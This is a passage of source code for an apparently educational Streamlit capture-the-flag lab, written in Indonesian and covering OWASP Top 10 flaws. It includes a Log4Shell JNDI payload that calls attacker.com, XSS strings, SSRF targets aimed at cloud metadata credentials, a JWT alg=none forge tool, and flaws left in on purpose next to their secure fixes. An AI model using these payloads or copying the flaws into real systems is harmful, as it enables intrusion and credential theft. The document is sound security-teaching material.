            is_injected = any(
                p in login_user_a03.lower() or p in login_pass_a03.lower()
                for p in sqli_patterns
            )

            if is_injected:
                st.markdown(f"""
                <div style="background:#0d1a0d;border:1px solid #1b5e20;border-radius:4px;padding:1rem;">
                    <p style="font-family:var(--mono);color:#00e676;margin:0;">
                        ✅ LOGIN BERHASIL VIA SQL INJECTION!
                    </p>
                    <p style="font-family:var(--mono);color:#90a4ae;margin:0.3rem 0 0 0;font-size:0.85rem;">
                        Logged in sebagai: <b style="color:#ff3c5a;">admin</b> [admin]<br>
                        Email: admin@svwl.local
                    </p>
                    <p style="font-family:var(--mono);color:#ffd600;margin-top:0.5rem;font-size:0.85rem;">
                        🚩 FLAG: {FLAGS["A03"]}
                    </p>
                </div>
                """, unsafe_allow_html=True)
            elif login_user_a03 in USERS_DB:
                stored = USERS_DB[login_user_a03]
                if stored.get("password_hash") == hashlib.md5(login_pass_a03.encode()).hexdigest():
                    st.success(f"Login berhasil sebagai {login_user_a03}.")
                else:
                    st.error("Username atau password salah.")
            else:
                st.error("Username atau password salah.")

        elif security_level == "Medium":
            clean_user = login_user_a03.replace("'", "''")
            st.code(
                f"[Query – escaped]: SELECT * FROM users WHERE username='{clean_user}'...",
                language="sql",
            )
            st.warning("Partial protection – masih rentan terhadap second-order injection.")
        else:
            st.code("""
# Parameterized query (aman)
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, hashed_password)
)""", language="python")
            stored = USERS_DB.get(login_user_a03, {})
            if stored and stored.get("password_hash") == hashlib.md5(login_pass_a03.encode()).hexdigest():
                st.success(f"✅ Login berhasil (secure mode): {login_user_a03}")
            else:
                st.error("Username atau password salah.")

    source_expander(
        """# VULNERABLE
query = f"SELECT * FROM users WHERE username='{user}' AND password=md5('{pwd}')"
cursor.execute(query)""",
        """# SECURE – Parameterized
cursor.execute(
    "SELECT * FROM users WHERE username=%s AND password=%s",
    (user, bcrypt_hash)
)""",
    )
    flag_submit("A03")

# ════════════════════════════════════════════
# TAB 4: A04 – INSECURE DESIGN (No Rate Limit)
# ════════════════════════════════════════════
with tabs[4]:
    lab_header("A04", "A04")
    st.markdown("""
    **Skenario:** Sistem tidak memiliki rate limiting pada endpoint sensitif.
    Simulasikan serangan brute force OTP 4-digit untuk menemukan kode yang benar.
    """)

    if "secret_otp" not in st.session_state:
        st.session_state.secret_otp = str(random.randint(1000, 9999))
    if "otp_attempts" not in st.session_state:
        st.session_state.otp_attempts = 0
    if "otp_locked" not in st.session_state:
        st.session_state.otp_locked = False

    hint_expander([
        "OTP terdiri dari 4 digit (0000–9999). Tanpa rate limit, brute force menjadi mudah.",
        "Klik 'Auto Brute Force' untuk mensimulasikan serangan otomatis.",
        "Bandingkan dengan mode High yang menerapkan lockout setelah 3 percobaan.",
    ])

    st.markdown("#### 📱 OTP Verification System")
    phone_suffix = random.randint(1000, 9999)
    st.info(f"Sistem mengirim OTP ke nomor ***-***-{phone_suffix}. Masukkan kode untuk verifikasi.")

    if security_level == "Low":
        st.markdown(
            f'<p style="font-family:var(--mono);font-size:0.75rem;color:#ff3c5a;">'
            f'Percobaan: {st.session_state.otp_attempts} | ⚠️ Tidak ada rate limit!</p>',
            unsafe_allow_html=True,
        )

        otp_input = st.text_input("Masukkan OTP (4 digit):", max_chars=4, key="a04_otp")

        col1, col2 = st.columns(2)
        with col1:
            if st.button("Verifikasi OTP", key="a04_verify"):
                st.session_state.otp_attempts += 1
                if otp_input == st.session_state.secret_otp:
                    st.success(f"✅ OTP Benar! FLAG: {FLAGS['A04']}")
                else:
                    st.error(f"OTP salah. (Percobaan ke-{st.session_state.otp_attempts})")

        with col2:
            if st.button("🤖 Auto Brute Force (Simulasi)", key="a04_brute"):
                found_at = int(st.session_state.secret_otp)
                progress = st.progress(0, text="Trying combinations...")
                steps    = min(found_at + 1, 200)
                for i in range(steps):
                    progress.progress(i / steps, text=f"Trying: {str(i).zfill(4)}")
                progress.progress(1.0, text="Found!")
                st.session_state.otp_attempts += found_at + 1
                st.markdown(f"""
                <div style="background:#0d1a0d;border:1px solid #1b5e20;border-radius:4px;padding:1rem;">
                    <p style="font-family:var(--mono);color:#00e676;margin:0;">
                        ✅ OTP DITEMUKAN: <b>{st.session_state.secret_otp}</b>
                    </p>
                    <p style="font-family:var(--mono);color:#90a4ae;font-size:0.82rem;margin:0.3rem 0 0 0;">
                        Total percobaan: {found_at + 1} | Estimasi waktu nyata: ~{(found_at+1)*0.01:.1f}s
                    </p>
                    <p style="font-family:var(--mono);color:#ffd600;margin-top:0.5rem;">
                        🚩 FLAG: {FLAGS["A04"]}
                    </p>
                </div>
                """, unsafe_allow_html=True)

    elif security_level == "Medium":
        st.warning("⚠️ Rate limit 10 percobaan per menit (masih dapat di-bypass dengan multiple IP).")
        otp_med = st.text_input("OTP:", max_chars=4, key="a04_otp_med")
        if st.button("Verifikasi", key="a04_med_btn"):
            st.session_state.otp_attempts += 1
            if st.session_state.otp_attempts > 10:
                st.error("⏳ Rate limit tercapai. Tunggu 60 detik.")
            else:
                st.error(f"OTP salah. ({st.session_state.otp_attempts}/10 percobaan)")
    else:
        st.success("✅ Mode aman: Lockout setelah 3 percobaan, CAPTCHA aktif, dan alert anomali diaktifkan.")
        st.code("""
MAX_ATTEMPTS = 3
LOCKOUT_SECONDS = 1800  # 30 menit

if attempts_cache[user_ip] >= MAX_ATTEMPTS:
    send_alert_to_security_team(user_ip)
    raise RateLimitError(f"Akun terkunci {LOCKOUT_SECONDS // 60} menit")
# Verifikasi CAPTCHA sebelum lanjut
if not verify_captcha(captcha_response):
    raise CaptchaError("CAPTCHA tidak valid")
""", language="python")

    flag_submit("A04")

# ════════════════════════════════════════════
# TAB 5: A05 – SECURITY MISCONFIGURATION
# ════════════════════════════════════════════
with tabs[5]:
    lab_header("A05", "A05")
    st.markdown("""
    **Skenario:** Server web dikonfigurasi dengan debug mode aktif, mengekspos stack trace,
    konfigurasi sistem, dan environment variables sensitif.
    """)

    hint_expander([
        "Coba endpoint /api/debug/env – environment variables sering menyimpan secret.",
        "Mode debug sering mengekspos secret keys, database credentials, dan path sistem.",
        "Perhatikan endpoint /debug dan /config yang terbuka tanpa autentikasi.",
    ])

    st.markdown("#### ⚙️ Debug & Configuration Endpoints")

    endpoint = st.selectbox("Pilih Endpoint:", [
        "/api/health",
        "/api/debug/info",
        "/api/debug/config",
        "/api/debug/env",
        "/api/error?trigger=true",
    ], key="a05_endpoint")

    if st.button("GET Request", key="a05_req"):
        if security_level == "Low":
            responses = {
                "/api/health": {
                    "status": "ok",
                    "version": "2.1.3",
                    "uptime": "14d 3h",
                },
                "/api/debug/info": {
                    "debug_mode": True,
                    "environment": "PRODUCTION",
                    "python_version": "3.11.4",
                    "framework": "Streamlit 1.35.0",
                    "server": "Ubuntu 22.04 LTS",
                    "ip_internal": "10.0.1.45",
                    "users_online": 3,
                },
                "/api/debug/config": {
                    "database_host": "postgres://10.0.1.10:5432",
                    "database_name": "svwl_prod",
                    "database_user": "svwl_app",
                    "database_pass": "Pr0d#DB2025!",
                    "secret_key": "django-insecure-abc123xyz-CHANGE-ME",
                    "allowed_hosts": ["*"],
                    "debug": True,
                },
                "/api/debug/env": {
                    "AWS_ACCESS_KEY_ID": "AKIA4EXAMPLE12345678",
                    "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                    "STRIPE_SECRET_KEY": "sk_live_EXAMPLE_KEY_1234567890",
                    "JWT_SECRET": "my-super-secret-jwt-key-2025",
                    "FLAG": FLAGS["A05"],
                    "SMTP_PASSWORD": "mailpass123",
                },
                "/api/error?trigger=true": {
                    "error": "AttributeError: 'NoneType' object has no attribute 'get'",
                    "traceback": (
                        "  File '/app/views.py', line 142, in get_user\n"
                        "    return db.query(User).filter_by(id=user_id).first().get('email')\n"
                        "  File '/app/models.py', line 67"
                    ),
                    "locals": {
                        "user_id": None,
                        "db_connection_string": "postgres://svwl_app:Pr0d#DB2025!@10.0.1.10/svwl_prod",
                    },
                },
            }
            data = responses.get(endpoint, {"error": "Not found"})
            st.code(json.dumps(data, indent=2), language="json")
            if endpoint == "/api/debug/env":
                st.warning("🚩 Environment variables mengandung flag dan credentials sensitif!")
        else:
            safe_resp = {"status": "ok", "message": "Debug endpoints disabled in production."}
            if endpoint == "/api/health":
                safe_resp = {"status": "ok"}
            st.code(json.dumps(safe_resp, indent=2), language="json")
            st.success("✅ Endpoint debug dinonaktifkan di production.")

    source_expander(
        """# VULNERABLE – debug aktif di production
DEBUG = True
ALLOWED_HOSTS = ['*']

@app.route('/debug/config')
def debug_config():
    return jsonify(app.config)  # Ekspos semua config!""",
        """# SECURE
DEBUG = os.getenv('DEBUG', 'False') == 'True'
ALLOWED_HOSTS = ['yourdomain.com']
# Semua debug endpoint dihapus di production
# Secret hanya dari environment variables terenkripsi (Vault, AWS Secrets Manager)""",
    )
    flag_submit("A05")

# ════════════════════════════════════════════
# TAB 6: A06 – VULNERABLE & OUTDATED COMPONENTS
# ════════════════════════════════════════════
with tabs[6]:
    lab_header("A06", "A06")
    st.markdown("""
    **Skenario:** Aplikasi menggunakan library dengan CVE yang diketahui (simulasi Log4Shell / CVE-2021-44228).
    Identifikasi komponen rentan dan demonstrasikan dampak JNDI injection.
    """)

    hint_expander([
        "Log4Shell (CVE-2021-44228) adalah kerentanan RCE kritis di Apache Log4j 2.x.",
        "Payload: `${jndi:ldap://attacker.com/exploit}` disisipkan ke field yang di-log.",
        "Masukkan payload ke field 'User-Agent' untuk trigger exploit.",
        "Gunakan Snyk, OWASP Dependency-Track, atau `npm audit` untuk deteksi komponen rentan.",
    ])

    st.markdown("#### 📦 Dependency Scanner (Simulasi)")
    st.markdown("""
    <div style="background:#060c18;border:1px solid #1e2d45;border-radius:4px;padding:1rem;font-family:var(--mono);font-size:0.78rem;">
        <p style="color:#ffd600;margin:0 0 0.5rem 0;">[!] VULNERABLE DEPENDENCIES DETECTED</p>
        <p style="color:#ff3c5a;margin:0;">log4j-core:2.14.1     – CVE-2021-44228 (CRITICAL, CVSS 10.0) 🔴</p>
        <p style="color:#ff6d00;margin:0;">commons-text:1.9      – CVE-2022-42889 (HIGH,     CVSS 9.8)  🟠</p>
        <p style="color:#ffd600;margin:0;">spring-core:5.3.0     – CVE-2022-22965 (HIGH,     CVSS 9.8)  🟡</p>
        <p style="color:#90a4ae;margin:0;">jackson-databind:2.9  – CVE-2019-20330 (HIGH,     CVSS 9.8)  🟡</p>
    </div>
    """, unsafe_allow_html=True)

    st.markdown("#### 🪵 Log4Shell Exploitation Simulator")
    user_agent_a06 = st.text_input(
        "Simulasi HTTP Header (User-Agent):",
        value="${jndi:ldap://attacker.com/exploit}",
        key="a06_payload",
    )

    if st.button("Send Request (Simulasi)", key="a06_send"):
        if security_level == "Low":
            jndi_pattern = r'\$\{jndi:'
            if re.search(jndi_pattern, user_agent_a06):
                st.markdown(f"""
                <div style="background:#0a0a0a;border:1px solid #4a1515;border-radius:4px;padding:1rem;">
                    <p style="font-family:var(--mono);color:#ff3c5a;margin:0 0 0.3rem 0;">[LOG4J] Processing log entry...</p>
                    <p style="font-family:var(--mono);color:#ffd600;margin:0;">INFO: User-Agent logged: {html.escape(user_agent_a06)}</p>
                    <p style="font-family:var(--mono);color:#ff3c5a;margin:0;">[!] JNDI lookup initiated: ldap://attacker.com/exploit</p>
                    <p style="font-family:var(--mono);color:#ff3c5a;margin:0;">[!] Remote class loading: Exploit.class</p>
                    <p style="font-family:var(--mono);color:#ff6d00;margin:0;">[!] RCE executed: id; whoami; cat /etc/passwd</p>
                    <p style="font-family:var(--mono);color:#00e676;margin:0.5rem 0 0 0;">
                        [EXFIL] {FLAGS["A06"]}
                    </p>
                </div>
                """, unsafe_allow_html=True)
                st.error("🚨 Remote Code Execution berhasil via Log4Shell!")
            else:
                st.info("Log: Request diterima dan di-log (tidak ada JNDI payload).")
        else:
            st.success("✅ Log4j telah diupdate ke v2.17.1+. WAF memblokir JNDI patterns.")
            if "${jndi:" in user_agent_a06:
                st.warning("⚠️ Payload terdeteksi dan diblokir oleh WAF Rule: LOG4J-001")

    source_expander(
        """# VULNERABLE – log4j 2.14.1
log4j.info("User-Agent: " + userAgent)
# ${jndi:ldap://...} akan dieksekusi oleh log4j""",
        """# SECURE
# 1. Update ke log4j 2.17.1+
# 2. Set LOG4J_FORMAT_MSG_NO_LOOKUPS=true
# 3. Sanitasi input sebelum logging
safe_agent = re.sub(r'\\$\\{.*?\\}', '[SANITIZED]', userAgent)
logger.info("User-Agent: {}", safe_agent)""",
    )
    flag_submit("A06")

# ════════════════════════════════════════════
# TAB 7: A07 – XSS (Injection – Output)
# ════════════════════════════════════════════
with tabs[7]:
    lab_header("A07", "A07")
    st.markdown("""
    **Skenario:** Kolom komentar tidak melakukan sanitasi output, memungkinkan stored XSS.
    Sisipkan payload HTML/JavaScript berbahaya yang akan di-render ke semua user.
    """)

    hint_expander([
        "Coba masukkan: `<b>Bold</b>` – apakah teks menjadi tebal?",
        "Payload XSS: `<img src=x onerror=alert('XSS-Stored!')>`",
        "Untuk stored XSS: komentar tersimpan dan di-render ke semua pengunjung.",
        "Markdown injection: `[click me](javascript:alert('XSS'))`",
    ])

    st.markdown("#### 💬 Kolom Komentar")

    for c in st.session_state.xss_comments:
        if security_level == "Low":
            st.markdown(f"""
            <div style="background:#141d2e;border:1px solid #1e2d45;border-radius:4px;
                        padding:0.7rem 1rem;margin-bottom:0.5rem;">
                <p style="font-family:var(--mono);font-size:0.7rem;color:#546e7a;margin:0 0 0.3rem 0;">
                    {c["author"]} – {c["ts"]}
                </p>
                <div style="color:#e8eaf6;">{c["text"]}</div>
            </div>
            """, unsafe_allow_html=True)
        else:
            st.markdown(f"""
            <div style="background:#141d2e;border:1px solid #1e2d45;border-radius:4px;
                        padding:0.7rem 1rem;margin-bottom:0.5rem;">
                <p style="font-family:var(--mono);font-size:0.7rem;color:#546e7a;margin:0 0 0.3rem 0;">
                    {html.escape(c["author"])} – {c["ts"]}
                </p>
                <p style="color:#e8eaf6;margin:0;">{html.escape(c["text"])}</p>
            </div>
            """, unsafe_allow_html=True)

    st.markdown("---")
    new_comment = st.text_area(
        "Tambah Komentar:",
        key="a07_comment",
        placeholder='Coba: <img src=x onerror=alert("XSS-Stored!")>',
    )

    col_sub, col_rst = st.columns([1, 1])
    with col_sub:
        if st.button("Kirim Komentar", key="a07_submit"):
            if new_comment.strip():
                ts = datetime.now().strftime("%H:%M")
                if security_level == "Low":
                    xss_indicators = ["<script", "onerror=", "onload=", "javascript:", "alert(", "document.cookie"]
                    has_xss = any(p.lower() in new_comment.lower() for p in xss_indicators)
                    st.session_state.xss_comments.append({
                        "author": st.session_state.current_user,
                        "text": new_comment,
                        "ts": ts,
                    })
                    if has_xss:
                        st.warning("⚠️ XSS payload tersimpan! Semua user yang membuka halaman ini akan terkena.")
                        st.success(f"🚩 FLAG: {FLAGS['A07']}")
                    else:
                        st.success("Komentar tersimpan (tanpa sanitasi).")
                else:
                    escaped = html.escape(new_comment)
                    st.session_state.xss_comments.append({
                        "author": st.session_state.current_user,
                        "text": escaped,
                        "ts": ts,
                    })
                    st.success("✅ Komentar tersimpan dengan aman (HTML di-escape).")
                st.rerun()
            else:
                st.error("Komentar tidak boleh kosong.")

    with col_rst:
        if st.button("🗑️ Reset Komentar", key="a07_reset"):
            st.session_state.xss_comments = [
                {"author": "alice", "text": "Lab ini sangat informatif!", "ts": "10:00"},
                {"author": "bob",   "text": "Saya belajar banyak dari SVWL.", "ts": "10:15"},
            ]
            st.rerun()

    source_expander(
        "# VULNERABLE – render mentah\nst.markdown(comment, unsafe_allow_html=True)",
        "# SECURE – escape HTML\nimport html\nsafe = html.escape(comment)\nst.text(safe)",
    )
    flag_submit("A07")

# ════════════════════════════════════════════
# TAB 8: A08 – SSRF
# ════════════════════════════════════════════
with tabs[8]:
    lab_header("A08", "A08")
    st.markdown("""
    **Skenario:** Fitur "fetch URL" tidak memvalidasi target, memungkinkan attacker
    mengakses resource internal yang tidak seharusnya bisa diakses dari luar.
    """)

    hint_expander([
        "Coba akses: http://169.254.169.254/latest/meta-data/ (AWS Instance Metadata)",
        "Navigasi ke: /latest/meta-data/iam/security-credentials/svwl-ec2-role",
        "Target internal lain: http://localhost:6379 (Redis), http://10.0.1.10:5432",
        "Cloud metadata service sering menyimpan credential IAM role.",
    ])

    st.markdown("#### 🌐 URL Fetcher (Simulasi Fitur Import)")

    ssrf_presets = {
        "Custom URL": "",
        "AWS Metadata Root": "http://169.254.169.254/latest/meta-data/",
        "AWS IAM Credentials": "http://169.254.169.254/latest/meta-data/iam/security-credentials/svwl-ec2-role",
        "Redis (localhost:6379)": "http://localhost:6379",
        "DB Server Internal": "http://10.0.1.10:5432",
        "Router Admin Panel": "http://192.168.1.1",
    }
    preset_choice = st.selectbox("Quick Targets:", list(ssrf_presets.keys()), key="a08_preset")
    default_url   = ssrf_presets[preset_choice] or "http://169.254.169.254/latest/meta-data/"
    url_input     = st.text_input("Masukkan URL:", value=default_url, key="a08_url")

    if st.button("Fetch URL", key="a08_fetch"):
        internal_patterns = {
            "169.254.169.254": {
                "/latest/meta-data/": (
                    "ami-id\nami-launch-index\nblock-device-mapping/\nhostname\niam/\n"
                    "instance-id: i-0abc123def456\ninstance-type: t3.medium\n"
                    "local-ipv4: 10.0.1.45\npublic-ipv4: 54.23.145.67"
                ),
                "/latest/meta-data/iam/": "security-credentials/",
                "/latest/meta-data/iam/security-credentials/": "svwl-ec2-role",
                "/latest/meta-data/iam/security-credentials/svwl-ec2-role": json.dumps({
                    "Code": "Success",
                    "Type": "AWS-HMAC",
                    "AccessKeyId": "ASIAEXAMPLE12345678",
                    "SecretAccessKey": "example+secret+key+do+not+use",
                    "Token": "example-session-token",
                    "Expiration": "2025-12-31T23:59:59Z",
                    "FLAG": FLAGS["A08"],
                }, indent=2),
            },
            "localhost:6379": {"": "PONG\n$7\nredis_db\n$4\ntest"},
            "10.0.1.10:5432": {"": "PostgreSQL 14.2 – ready for connection\nDatabase: svwl_prod"},
            "192.168.1.1": {"": "<html><title>Router Admin</title><body>Login: admin/admin</body></html>"},
        }

        if security_level == "Low":
            matched = False
            for host, paths in internal_patterns.items():
                if host in url_input:
                    matched = True
                    raw_path = url_input.split(host)[-1] or "/"
                    content  = (
                        paths.get(raw_path)
                        or paths.get(raw_path.rstrip("/") + "/")
                        or paths.get("/", "OK")
                    )
                    st.markdown(f"""
                    <div style="background:#060c18;border:1px solid #4a1515;border-radius:4px;padding:1rem;">
                        <p style="font-family:var(--mono);color:#ff3c5a;margin:0 0 0.3rem 0;">
                            [SSRF] Internal resource fetched: {html.escape(url_input)}
                        </p>
                        <pre style="font-family:var(--mono);color:#00e676;margin:0;white-space:pre-wrap;">{html.escape(str(content))}</pre>
                    </div>
                    """, unsafe_allow_html=True)
                    if FLAGS["A08"] in str(content):
                        st.error("🚨 Cloud credentials dan FLAG berhasil dieksfiltrasi!")
                    break
            if not matched:
                st.info(f"Fetching: {html.escape(url_input)} ... (simulasi – hanya URL internal yang direspons)")
        else:
            blocklist = ["169.254.", "10.", "192.168.", "172.16.", "localhost", "127.", "0.0.0.0"]
            is_blocked = any(b in url_input for b in blocklist)
            if is_blocked:
                st.error("🚫 URL diblokir! Request ke IP private/internal tidak diizinkan.")
                st.code("Block reason: SSRF_PROTECTION – Private IP range detected", language="text")
            elif url_input.startswith("https://"):
                st.success(f"✅ URL aman, melanjutkan fetch ke: {html.escape(url_input)}")
            else:
                st.error("Hanya HTTPS ke domain publik yang diizinkan.")

    source_expander(
        """# VULNERABLE – fetch tanpa validasi
import requests
resp = requests.get(user_provided_url)
return resp.text""",
        """# SECURE – allowlist + blocklist
BLOCKED_RANGES = ['10.', '192.168.', '169.254.', 'localhost', '127.']

def safe_fetch(url):
    if not url.startswith('https://'):
        raise ValueError("HTTPS only")
    if any(b in url for b in BLOCKED_RANGES):
        raise ValueError("Private IP blocked")
    return requests.get(url, timeout=5, allow_redirects=False)""",
    )
    flag_submit("A08")

# ════════════════════════════════════════════
# TAB 9: A09 – LOGGING & MONITORING FAILURES
# ════════════════════════════════════════════
with tabs[9]:
    lab_header("A09", "A09")
    st.markdown("""
    **Skenario:** Sistem tidak mencatat event kritis seperti login gagal, akses ditolak,
    dan perubahan data sensitif. Demonstrasikan dampak blind spot monitoring.
    """)

    hint_expander([
        "Lakukan beberapa aksi berbahaya dan perhatikan apakah ada alert yang muncul.",
        "Pada mode Low: event tidak di-log, attacker bebas beroperasi tanpa terdeteksi.",
        "Flag muncul setelah 3 aksi berbahaya berhasil dilakukan tanpa deteksi.",
        "Di mode High, setiap aksi menciptakan log entry yang bisa diaudit.",
    ])

    st.markdown("#### 📋 Audit Log Simulator")

    col1, col2 = st.columns(2)
    with col1:
        action_type = st.selectbox("Tipe Aksi:", [
            "Login Gagal (brute force)",
            "Akses Dokumen Rahasia",
            "Perubahan Permission User",
            "Export Data Massal",
            "Disable Security Rule",
        ], key="a09_action")
    with col2:
        target = st.text_input("Target Resource:", value="/api/admin/users", key="a09_target")

    if st.button("Eksekusi Aksi", key="a09_exec"):
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        action_code = {
            "Login Gagal (brute force)":    "AUTH_FAIL",
            "Akses Dokumen Rahasia":         "ACCESS_DENIED",
            "Perubahan Permission User":     "PRIV_CHANGE",
            "Export Data Massal":            "DATA_EXPORT",
            "Disable Security Rule":         "SEC_RULE_DISABLE",
        }[action_type]

        high_severity = action_code in ("AUTH_FAIL", "PRIV_CHANGE", "SEC_RULE_DISABLE")

        if security_level == "Low":
            st.markdown(f"""
            <div style="background:#060c18;border:1px solid #1e2d45;border-radius:4px;padding:1rem;">
                <p style="font-family:var(--mono);color:#ffd600;margin:0 0 0.3rem 0;">
                    [SYS] Aksi dieksekusi: {action_type}
                </p>
                <p style="font-family:var(--mono);color:#37474f;margin:0;">[LOG] &lt;kosong&gt;</p>
                <p style="font-family:var(--mono);color:#37474f;margin:0;">[ALERT] &lt;tidak ada&gt;</p>
                <p style="font-family:var(--mono);color:#546e7a;margin:0.5rem 0 0 0;font-size:0.8rem;">
                    ↑ Tidak ada yang tercatat. Attacker beroperasi dalam kegelapan.
                </p>
            </div>
            """, unsafe_allow_html=True)

            st.session_state.a09_blind_count += 1

            if st.session_state.a09_blind_count >= 3:
                st.warning(f"💀 {st.session_state.a09_blind_count} aksi berbahaya dilakukan tanpa deteksi apapun!")
                st.success(f"🚩 FLAG: {FLAGS['A09']}")
            else:
                remaining = 3 - st.session_state.a09_blind_count
                st.info(f"Lakukan {remaining} aksi lagi untuk mendapatkan flag...")
        else:
            log_entry = {
                "timestamp": ts,
                "event_id":  f"EVT-{random.randint(10000, 99999)}",
                "severity":  "HIGH" if high_severity else "MEDIUM",
                "type":      action_code,
                "user":      st.session_state.current_user,
                "ip":        "203.0.113.45",
                "target":    target,
                "action":    action_type,
                "result":    "BLOCKED",
            }
            st.session_state.ssrf_log.append(log_entry)
            st.code(json.dumps(log_entry, indent=2), language="json")
            if log_entry["severity"] == "HIGH":
                st.error("🚨 HIGH severity event! Alert dikirim ke SOC team & SIEM.")

    if st.session_state.ssrf_log:
        st.markdown("#### 📊 Audit Trail (5 terbaru)")
        for entry in reversed(st.session_state.ssrf_log[-5:]):
            color = "#ff3c5a" if entry["severity"] == "HIGH" else "#ffd600"
            st.markdown(f"""
            <div style="background:#060c18;border-left:2px solid {color};
                        padding:0.5rem 0.8rem;margin-bottom:0.3rem;border-radius:0 2px 2px 0;">
                <span style="font-family:var(--mono);font-size:0.75rem;color:{color};">[{entry["severity"]}]</span>
                <span style="font-family:var(--mono);font-size:0.75rem;color:#90a4ae;margin-left:0.5rem;">
                    {entry["timestamp"]} | {entry["type"]} | User: {entry["user"]}
                </span>
            </div>
            """, unsafe_allow_html=True)

    flag_submit("A09")

# ════════════════════════════════════════════
# TAB 10: A10 – JWT AUTH BYPASS (None Algorithm)
# ════════════════════════════════════════════
with tabs[10]:
    lab_header("A10", "A10")
    st.markdown("""
    **Skenario:** Server menerima JWT dengan algoritma `none` (None Algorithm Attack).
    Modifikasi token untuk eskalasi privilege dari `user` ke `admin` tanpa mengetahui secret key.
    """)

    hint_expander([
        "JWT terdiri dari 3 bagian: header.payload.signature (base64url encoded).",
        "Kerentanan: server menerima alg=none dan mengabaikan verifikasi signature.",
        "Ubah payload: role=user → role=admin, kemudian set alg=none dan hapus signature.",
        "Gunakan tool Forge di bawah, pilih alg=none dan role=admin, lalu submit token hasil forge.",
    ])

    # Decode token saat ini
    current_token = st.session_state.session_token
    try:
        parts = current_token.split(".")
        if len(parts) >= 2:
            padding       = "=" * (-len(parts[1]) % 4)
            decoded_payload = json.loads(base64.urlsafe_b64decode(parts[1] + padding).decode())
        else:
            decoded_payload = {"user": "guest", "role": "user"}
    except Exception:
        decoded_payload = {"user": "guest", "role": "user"}

    st.markdown("#### 🎭 JWT Token Lab")

    col1, col2 = st.columns(2)
    with col1:
        st.markdown('<p style="font-family:var(--mono);font-size:0.75rem;color:#546e7a;">TOKEN SAAT INI</p>', unsafe_allow_html=True)
        st.code(current_token, language="text")
        st.markdown('<p style="font-family:var(--mono);font-size:0.75rem;color:#546e7a;">DECODED PAYLOAD</p>', unsafe_allow_html=True)
        st.code(json.dumps(decoded_payload, indent=2), language="json")

    with col2:
        st.markdown('<p style="font-family:var(--mono);font-size:0.75rem;color:#546e7a;">JWT FORGE TOOL</p>', unsafe_allow_html=True)
        forge_user = st.text_input("User:", value=decoded_payload.get("user", "guest"), key="a10_user")
        forge_role = st.selectbox("Role:", ["user", "dev", "admin"], key="a10_role")
        forge_alg  = st.selectbox(
            "Algorithm:",
            ["HS256", "none", "RS256"],
            key="a10_alg",
            help="Pilih 'none' untuk None Algorithm Attack",
        )

        if st.button("🔨 Forge Token", key="a10_forge"):
            header  = {"alg": forge_alg, "typ": "JWT"}
            payload = {"user": forge_user, "role": forge_role, "iat": int(time.time())}

            h_enc = base64.urlsafe_b64encode(json.dumps(header, separators=(",", ":")).encode()).rstrip(b"=").decode()
            p_enc = base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode()).rstrip(b"=").decode()

            if forge_alg == "none":
                forged = f"{h_enc}.{p_enc}."
            else:
                forged = f"{h_enc}.{p_enc}.INVALID_SIGNATURE_FOR_DEMO"

            st.session_state.forged_token = forged
            st.success("Token berhasil di-forge! Copy token di bawah ke form 'Submit JWT Token'.")
            st.code(forged, language="text")

    st.markdown("---")
    st.markdown("#### 🚪 Protected Admin Panel")

    # Tampilkan token yang di-forge jika ada
    default_submit = st.session_state.get("forged_token", current_token)
    token_input = st.text_input("Submit JWT Token:", value=default_submit, key="a10_token_submit")

    if st.button("Akses Admin Panel", key="a10_access"):
        try:
            parts = token_input.split(".")
            if len(parts) < 2:
                st.error("Format token tidak valid (harus format header.payload.signature).")
            else:
                pad_h = "=" * (-len(parts[0]) % 4)
                pad_p = "=" * (-len(parts[1]) % 4)
                header  = json.loads(base64.urlsafe_b64decode(parts[0] + pad_h).decode())
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + pad_p).decode())

                if security_level == "Low":
                    if header.get("alg") == "none" and payload.get("role") == "admin":
                        st.markdown(f"""
                        <div style="background:#0d1a0d;border:1px solid #1b5e20;border-radius:4px;padding:1rem;">
                            <p style="font-family:var(--mono);color:#00e676;margin:0;">
                                ✅ AKSES DIBERIKAN – None Algorithm Bypass Berhasil!
                            </p>
                            <p style="font-family:var(--mono);color:#90a4ae;margin:0.3rem 0 0 0;font-size:0.85rem;">
                                User: <b style="color:#ff3c5a;">{html.escape(str(payload.get("user", "?")))}</b>
                                | Role: <b style="color:#ff3c5a;">{payload.get("role")}</b>
                            </p>
                            <p style="font-family:var(--mono);color:#ffd600;margin-top:0.5rem;">
                                🚩 FLAG: {FLAGS["A10"]}
                            </p>
                        </div>
                        """, unsafe_allow_html=True)
                    elif header.get("alg") == "none" and payload.get("role") != "admin":
                        st.warning("Token alg=none diterima, tapi role bukan admin. Ganti role menjadi 'admin'.")
                    elif payload.get("role") == "admin":
                        st.error("Signature tidak valid. Gunakan alg=none untuk bypass verifikasi!")
                    else:
                        st.info(f"Token valid untuk user '{payload.get('user')}' dengan role '{payload.get('role')}'.")
                else:
                    if header.get("alg") == "none":
                        st.error("🚫 Algoritma 'none' tidak diterima! Server hanya menerima HS256/RS256 dengan verifikasi signature.")
                    elif payload.get("role") == "admin":
                        st.error("🚫 Token signature tidak dapat diverifikasi tanpa secret key. Akses ditolak.")
                    else:
                        st.info(f"✅ Token diproses. Selamat datang, {payload.get('user')} [{payload.get('role')}].")
        except Exception as e:
            st.error(f"Token tidak dapat di-parse: {e}")

    source_expander(
        """# VULNERABLE – accept alg:none
header = decode_header(token)
if header["alg"] == "none":
    payload = decode_payload(token)
    # Tidak ada verifikasi signature!
    return payload""",
        """# SECURE – enforce algorithm
import jwt
ALLOWED_ALGS = ["HS256", "RS256"]
try:
    payload = jwt.decode(
        token,
        SECRET_KEY,
        algorithms=ALLOWED_ALGS,   # none TIDAK diizinkan
        options={"verify_signature": True}
    )
except jwt.InvalidTokenError:
    raise AuthError("Invalid token")""",
    )
    flag_submit("A10")

# ════════════════════════════════════════════
# TAB 11: SCOREBOARD GLOBAL + SUBMIT FLAG
# ════════════════════════════════════════════
with tabs[11]:
    st.markdown("""
    <div style="text-align:center;padding:1rem 0 1.5rem 0;">
        <h2 style="font-family:var(--mono);color:#2979ff;margin:0;">🚩 Flag Submission & Scoreboard</h2>
        <p style="color:#546e7a;font-family:var(--mono);font-size:0.8rem;margin:0.3rem 0 0 0;">
